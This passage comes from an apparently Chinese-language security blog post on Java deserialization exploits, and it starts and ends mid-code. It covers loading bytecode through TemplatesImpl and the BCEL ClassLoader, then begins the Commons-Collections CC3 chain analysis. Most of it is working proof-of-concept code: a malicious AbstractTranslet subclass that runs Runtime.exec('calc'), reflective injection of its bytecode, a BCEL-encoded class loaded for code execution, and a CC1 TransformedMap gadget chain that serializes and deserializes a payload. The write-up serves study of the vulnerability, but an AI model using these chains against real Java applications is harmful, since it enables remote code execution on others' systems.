<span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-comment">//这里先赋值看poc是否成功</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        templates.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">执行后报错：NullPointerException</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705977.png"></p><p><font style="color:#080808;background-color:#ffffff;">调试查找哪里出了问题：</font></p><p><font style="color:#080808;background-color:#ffffff;">可以看到 _transletIndex:-1。我们需要进入到 if 语句才能正常执行</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705557.png"></p><p><font style="color:#080808;background-color:#ffffff;">所以要让执行类继承 </font><font style="color:rgb(44, 62, 80);">AbstractTranslet</font><font style="color:#080808;background-color:#ffffff;"> 类(对应：ABSTRACT_TRANSLET)，</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705525.png"></p><p><font style="color:#080808;background-color:#ffffff;">最终完整的执行类：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br>    <span class="hljs-keyword">static</span>  &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplateImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        templates.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705801.png"></p><h3 id="2-4-利用-BCEL-ClassLoader-加载字节码"><a href="#2-4-利用-BCEL-ClassLoader-加载字节码" class="headerlink" title="2.4 利用 BCEL ClassLoader 加载字节码"></a><font style="color:#080808;background-color:#ffffff;">2.4 利用 BCEL ClassLoader 加载字节码</font></h3><blockquote><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中。</p><p>关于BCEL的详细介绍：<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">《BCEL ClassLoader去哪了》</a></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCEL</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(calc);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(javaClass.getBytes(),<span class="hljs-literal">true</span>);<br>        System.out.println(code);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705534.png"></p><p><font style="color:#080808;background-color:#ffffff;">执行后可以看到有一对乱码：</font><font style="color:rgb(80, 80, 92);">BCEL ClassLoader 正是用于加载这串特殊的“字节码”，并可以执行其中的代码。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$l$8b$I$A$A$A$A$A$A$Am$<span class="hljs-number">91</span>$c9N$c3$<span class="hljs-number">40</span>$M$<span class="hljs-number">86</span>$ffi$d3$s$N$v$85B$d9$f7$b5$e5$<span class="hljs-number">40</span>$_$dc$<span class="hljs-number">40</span>$5c$QH$<span class="hljs-number">88</span>$b0$<span class="hljs-number">88</span>$o8O$87Q$Z$II$95N$Ro$c4$<span class="hljs-number">99</span>$L$m$O$3c$A$P$<span class="hljs-number">85</span>$f0$M$ab$E$91b$c7$bf$ed$cf$b6$f2$fa$f6$fc$C$<span class="hljs-number">60</span>$NK$3e$3c$M$fb$Y$c1$a8$<span class="hljs-number">871</span>$e3$c7$5dL$f8$c8a$d2$c5$<span class="hljs-number">94</span>$8bi$<span class="hljs-number">86</span>$fc$<span class="hljs-number">86</span>$8a$<span class="hljs-number">95</span>$ded$c8Vk$a7$M$ceVr$$$ZJ$a1$8a$e5A$f7$ba$v$d3$T$de$8cH$v$<span class="hljs-number">87</span>$<span class="hljs-number">89</span>$e0$d1$vO$<span class="hljs-number">95</span>$<span class="hljs-number">89</span>$3fEG_$a8$O1$c2$z$k$89u$GoCD$9f8F$e9Jx$c9ox$<span class="hljs-number">5d</span>$r$f5$dd$c3$ed$5b$n$dbZ$r1$<span class="hljs-number">95</span>$V$h$9a$8b$ab$<span class="hljs-number">7d</span>$de$b6$Y$da$<span class="hljs-number">88</span>$c1o$q$ddT$c8$je$b0$F$<span class="hljs-number">83</span>$5b5$bd$B$K$f0$<span class="hljs-number">5d</span>$cc$E$<span class="hljs-number">98</span>$c5$i$cd$a3$VD$80y$y0$M$fc$c3$O$b0$I$df$iAe$M$<span class="hljs-number">7d</span>$b6$o$e2q$ab$7e$d8$bc$94B3$f4$ffH$c7$ddX$abk$9a$e6$b7$a4$fe$O$w$d5Z$f8$a7$86Vv$e4$ad$q$e4r$f5W$b6$a1S$V$b7$d6$7f7$i$a5$<span class="hljs-number">89</span>$<span class="hljs-number">90</span>$<span class="hljs-number">9d</span>$O5$<span class="hljs-number">94</span>$da$<span class="hljs-number">94</span>$d4$f6$d0$<span class="hljs-number">93</span>$<span class="hljs-number">94</span>$LI$H$b8$f43$cc$<span class="hljs-number">93</span>$B3g$<span class="hljs-number">91</span>$ed$a1$a8N$9e$<span class="hljs-number">91</span>$cf$ad$3c$<span class="hljs-number">82</span>$dd$dbt$406o$c5$y$8ad$<span class="hljs-number">83</span>$<span class="hljs-number">8f</span>$C$f4$a2D$deC$dfw3$b70$a0$fc$84L9$fb$A$e7$ec$O$de$de$ca$D$f2$f7V$_Po$8e$u$868D_$<span class="hljs-number">86</span>$5b$b0$aaKd$P$fdD$fa$9aP$84Cq$<span class="hljs-number">99</span>$a2$Bz$5ddB$X$<span class="hljs-number">83</span>$O$r$wv$a9$a1w$m$c7$fd$faV$C$A$A<br></code></pre></td></tr></table></figure><blockquote><p>BCEL 这个包中有个有趣的类<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，他是一个 ClassLoader，但是他重写了 Java 内置的<code>ClassLoader#loadClass()</code>方法。</p><p>在 <code>ClassLoader#loadClass()</code> 中，其会判断类名是否是 <code>$$BCEL$$</code> 开头，如果是的话，将会对这个字符串进行 decode</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELRCE</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-string">&quot;$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5$e5$40$_$dc$40$5c$QH$88$b0$88$o8O$87Q$Z$II$95N$Ro$c4$99$L$m$O$3c$A$P$85$f0$M$ab$E$91b$c7$bf$ed$cf$b6$f2$fa$f6$fc$C$60$NK$3e$3c$M$fb$Y$c1$a8$871$e3$c7$5dL$f8$c8a$d2$c5$94$8bi$86$fc$86$8a$95$ded$c8Vk$a7$M$ceVr$$$ZJ$a1$8a$e5A$f7$ba$v$d3$T$de$8cH$v$87$89$e0$d1$vO$95$89$3fEG_$a8$O1$c2$z$k$89u$GoCD$9f8F$e9Jx$c9ox$5d$r$f5$dd$c3$ed$5b$n$dbZ$r1$95$V$h$9a$8b$ab$7d$de$b6$Y$da$88$c1o$q$ddT$c8$je$b0$F$83$5b5$bd$B$K$f0$5d$cc$E$98$c5$i$cd$a3$VD$80y$y0$M$fc$c3$O$b0$I$df$iAe$M$7d$b6$o$e2q$ab$7e$d8$bc$94B3$f4$ffH$c7$ddX$abk$9a$e6$b7$a4$fe$O$w$d5Z$f8$a7$86Vv$e4$ad$q$e4r$f5W$b6$a1S$V$b7$d6$7f7$i$a5$89$90$9d$O5$94$da$94$d4$f6$d0$93$94$LI$H$b8$f43$cc$93$B3g$91$ed$a1$a8N$9e$91$cf$ad$3c$82$dd$dbt$406o$c5$y$8ad$83$8f$C$f4$a2D$deC$dfw3$b70$a0$fc$84L9$fb$A$e7$ec$O$de$de$ca$D$f2$f7V$_Po$8e$u$868D_$86$5b$b0$aaKd$P$fdD$fa$9aP$84Cq$99$a2$Bz$5ddB$X$83$O$r$wv$a9$a1w$m$c7$fd$faV$C$A$A&quot;</span>).newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706693.png"></p><h1 id="CC3-链分析"><a href="#CC3-链分析" class="headerlink" title="CC3 链分析"></a>CC3 链分析</h1><h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>JDK ：8u65</p><p><font style="color:#080808;background-color:#ffffff;">commons-collections 3.2.1</font></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><h2 id="分析链"><a href="#分析链" class="headerlink" title="分析链"></a>分析链</h2><p>CC3 利用的就是上文分析的 ”利用 TemplatesImpl 加载字节码“这条链，然后结合 CC1&#x2F;CC6 的前半部分形成可用 POC。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706437.png"></p><h3 id="TemplatesImpl-链："><a href="#TemplatesImpl-链：" class="headerlink" title="TemplatesImpl 链："></a>TemplatesImpl 链：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br>    <span class="hljs-keyword">static</span>  &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplateImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        templates.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CC1-CC3-（InvokerTransformer）"><a href="#CC1-CC3-（InvokerTransformer）" class="headerlink" title="CC1 + CC3 （InvokerTransformer）"></a>CC1 + CC3 （<strong><font style="color:rgb(44, 62, 80);">InvokerTransformer）</font></strong></h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706301.png"></p><h4 id="CC1："><a href="#CC1：" class="headerlink" title="CC1："></a>CC1：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    